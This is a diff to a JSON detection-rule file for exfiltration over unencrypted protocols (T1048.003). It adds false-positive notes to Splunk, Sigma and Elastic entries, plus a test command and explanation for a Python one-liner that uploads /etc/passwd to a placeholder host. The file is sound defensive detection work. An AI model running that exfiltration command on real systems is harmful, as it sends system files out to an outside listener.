@@ -106,7 +106,8 @@
           "T1048.003"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate large file transfers (backups, migrations, cloud sync)"
       },
       {
         "platform": "splunk",
@@ -117,7 +118,8 @@
           "T1048.003"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Authorized admin commands, cron jobs, or configuration management tools (Ansible, Puppet)"
       },
       {
         "platform": "sigma",
@@ -128,7 +130,8 @@
           "T1048.003"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate system tools performing similar operations (e.g. admin scripts, management agents)"
       },
       {
         "platform": "elastic",
@@ -138,7 +141,9 @@
         "attack": [
           "T1048.003"
         ],
-        "fidelity": "telemetry"
+        "fidelity": "telemetry",
+        "false_positives": "Legitimate admin tools or management agents performing similar endpoint operations",
+        "confidence": "low"
       }
     ],
     "visibility": {
@@ -169,7 +174,8 @@
         "Review Microsoft Defender for Endpoint, Linux Audit (auditd), Sysmon for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "python3 -c 'import requests;requests.post(\"http://<ip>:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'"
     }
   },
   "explain": "Pushes a local file out to your listener with an inline interpreter one-liner:\n  requests.post(\"http://<ip>:8000/upload\", ...)   POST to a Python uploadserver\n  files={\"files\":open(\"/etc/passwd\",\"rb\")}          attach the file as multipart form data\nLands the file on your box; pair it with a running uploadserver, or use the urlopen variant to just read a served file back."
